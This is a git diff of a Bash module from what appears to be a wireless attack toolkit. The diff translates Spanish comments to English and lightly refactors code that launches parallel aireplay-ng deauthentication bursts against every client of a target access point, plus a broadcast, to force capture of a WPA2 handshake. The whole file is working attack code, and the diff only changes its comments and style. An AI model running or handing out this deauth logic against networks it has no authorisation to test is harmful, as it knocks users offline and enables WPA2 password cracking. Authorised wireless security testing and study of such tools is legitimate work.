@@ -1,26 +1,26 @@
 #!/usr/bin/env bash
-# lib/deauth.sh — Ataque de desautenticación para forzar handshake WPA2
-# No ejecutar directamente. Cargado por wlab.sh
+# lib/deauth.sh -- Deauthentication to force a WPA2 handshake.
+# Not executed directly. Loaded by the entrypoint.
 #
 # DISEÑO — TODOS LOS CLIENTES EN PARALELO:
 # ─────────────────────────────────────────
-# Cada cliente recibe su propio proceso aireplay-ng lanzado en background
-# simultáneamente. 1 cliente o 1000 → mismo mecanismo, misma ráfaga.
+# Every client gets its own aireplay-ng process launched in the background
+# simultaneously. 1 client or 1000 -> same mechanism, same burst.
 # Al final de cada ronda se hace wait de todos antes de la siguiente.
 # run_deauth termina inmediatamente cuando capture.sh hace kill $deauth_pid.
 
-# _deauth_burst: una ronda completa — todos los clientes + broadcast en paralelo.
+# _deauth_burst: one full round -- all clients + broadcast in parallel.
 _deauth_burst() {
     local round="$1" log_file="$2"
     shift 2
     local -a macs=("$@")
     local -a pids=()
 
-    dbg "── Ronda ${round}: deauth paralelo a $(( ${#macs[@]} + 1 )) target(s) ──"
+    dbg "-- Round ${round}: parallel deauth to $(( ${#macs[@]} + 1 )) target(s) --"
 
-    # Un proceso por cliente, todos simultáneos
+    # One process per client, all simultaneous
     for mac in "${macs[@]}"; do
-        dbg "  [parallel] dirigido → ${mac}"
+        dbg "  [parallel] directed -> ${mac}"
         aireplay-ng \
             --deauth "$DEAUTH_N" \
             -a "$TARGET" \
@@ -29,8 +29,8 @@ _deauth_burst() {
         pids+=($!)
     done
 
-    # Broadcast siempre, en paralelo con los dirigidos
-    dbg "  [parallel] broadcast → AP ${TARGET}"
+    # Broadcast always, in parallel with the directed ones
+    dbg "  [parallel] broadcast -> AP ${TARGET}"
     aireplay-ng \
         --deauth "$DEAUTH_N" \
         -a "$TARGET" \
@@ -42,27 +42,29 @@ _deauth_burst() {
         wait "$pid" 2>/dev/null || true
     done
 
-    dbg "  Ronda ${round} completada."
+    dbg "  Round ${round} done."
 }
 
-# run_deauth: carga clientes, lanza el ciclo de rondas en background.
+# run_deauth: load clients, launch the round loop in the background.
 # Imprime el PID del subshell a stdout para que capture.sh lo pueda matar.
 run_deauth() {
     local log_file="$1"
     local -a client_macs=()
 
     while IFS= read -r mac; do
-        [[ -n "$mac" ]] && client_macs+=("$mac")
+        if [[ -n "$mac" ]]; then
+            client_macs+=("$mac")
+        fi
     done < <(get_client_macs)
 
     local n=${#client_macs[@]}
     if (( n > 0 )); then
-        info "Deauth paralelo: ${n} cliente(s) + broadcast  (${DEAUTH_ROUNDS} ronda(s))"
+        info "Parallel deauth: ${n} client(s) + broadcast  (${DEAUTH_ROUNDS} round(s))"
         for mac in "${client_macs[@]}"; do
-            info "  → ${mac}"
+            info "  -> ${mac}"
         done
     else
-        warn "Sin clientes — deauth broadcast únicamente  (${DEAUTH_ROUNDS} ronda(s))."
+        warn "No clients -- broadcast deauth only  (${DEAUTH_ROUNDS} round(s))."
     fi
 
     (
@@ -70,7 +72,7 @@ run_deauth() {
             _deauth_burst "$r" "$log_file" "${client_macs[@]}"
             (( r < DEAUTH_ROUNDS )) && sleep "$DEAUTH_INTERVAL"
         done
-        dbg "Ciclo deauth completado (${DEAUTH_ROUNDS} rondas)."
+        dbg "Deauth cycle done (${DEAUTH_ROUNDS} rounds)."
     ) &
 
     echo $!
